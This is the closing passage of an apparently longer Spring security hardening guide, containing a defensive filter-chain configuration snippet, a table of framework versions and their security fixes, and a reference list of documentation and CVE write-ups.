    return new MvcRequestMatcher.Builder(introspector);
}

@Bean
SecurityFilterChain filterChain(HttpSecurity http, MvcRequestMatcher.Builder mvc) {
    http.authorizeHttpRequests(auth -> auth
        .requestMatchers(mvc.pattern("/admin/**")).hasRole("ADMIN")
        .anyRequest().authenticated()
    );
    return http.build();
}
```

---

## Appendix D: Framework Version Security Timeline

| Version | Release Date | Key Security Changes | Breaking Changes |
|---------|--------------|---------------------|------------------|
| **Spring Framework 6.1** | 2023-11 | Declarative binding mode (`setDeclarativeBinding`) | None |
| **Spring Framework 6.0** | 2022-11 | Jakarta EE 9+ (javax → jakarta namespace) | **Yes** - Package rename |
| **Spring Framework 5.3.19** | 2022-04 | Fix CVE-2022-22968 (case-sensitive disallowedFields) | None |
| **Spring Security 6.0** | 2022-11 | `authorizeHttpRequests` replaces `authorizeRequests` | Recommended migration |
| **Spring Security 5.7.0** | 2022-05 | Fix CVE-2022-22978 (RegexRequestMatcher bypass) | None |
| **Spring Boot 3.0** | 2022-11 | Java 17 baseline, Jakarta EE 9+ | **Yes** - Java 17 required |
| **Spring Boot 2.7.x** | 2022+ | Last 2.x line (Java 8+ compatible) | None |

**Recommendation**: Migrate to Spring Boot 3.x / Spring Framework 6.x for ongoing security support. Spring Boot 2.x enters maintenance mode in 2025.

---

## References

### Official Documentation
- [Spring Framework Documentation](https://docs.spring.io/spring-framework/reference/)
- [Spring Security Reference](https://docs.spring.io/spring-security/reference/)
- [Spring Boot Actuator Documentation](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html)
- [Spring Security Advisories](https://spring.io/security/)
- [Method Security (SpEL)](https://docs.spring.io/spring-security/reference/servlet/authorization/method-security.html)

### Source Code Analysis
- [DataBinder.java](https://github.com/spring-projects/spring-framework/blob/main/spring-context/src/main/java/org/springframework/validation/DataBinder.java)
- [SpelExpressionParser.java](https://github.com/spring-projects/spring-framework/blob/main/spring-expression/src/main/java/org/springframework/expression/spel/standard/SpelExpressionParser.java)
- [RegexRequestMatcher.java](https://github.com/spring-projects/spring-security/blob/main/web/src/main/java/org/springframework/security/web/util/matcher/RegexRequestMatcher.java)

### Security Research & CVE Analysis
- [SpEL Injection | Application Security Cheat Sheet](https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spel-injection)
- [Spring Boot Actuator Misconfigurations | Wiz Blog](https://www.wiz.io/blog/spring-boot-actuator-misconfigurations)
- [CVE-2022-22947: Spring Cloud Gateway RCE](https://spring.io/security/cve-2022-22947/)
- [CVE-2022-22963: Spring Cloud Function SpEL Injection](https://www.akamai.com/blog/security/spring-cloud-function)
- [CVE-2022-22978: Authorization Bypass in RegexRequestMatcher](https://spring.io/blog/2022/05/15/cve-2022-22978-authorization-bypass-in-regexrequestmatcher/)
- [CVE-2022-22980: Spring Data MongoDB SpEL Injection](https://spring.io/security/cve-2022-22980/)
- [CVE-2025-41253: Spring Cloud Gateway Environment Exposure](https://zeropath.com/blog/cve-2025-41253-spring-cloud-gateway-spel-exposure)
- [Mass Assignment - OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- [Exploiting Spring Boot Actuators | Veracode](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)
- [RCE via Actuators and H2 Database | Spaceraccoon](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/)

### Practical Guides
- [Spring Security Method Security Annotations | CodingNomads](https://codingnomads.com/spring-method-security-annotations)
- [Introduction to Spring Method Security | Baeldung](https://www.baeldung.com/spring-security-method-security)
- [Spring Boot Actuator Security Guide | Centron](https://www.centron.de/en/tutorial/spring-boot-actuator-endpoints-guide/)
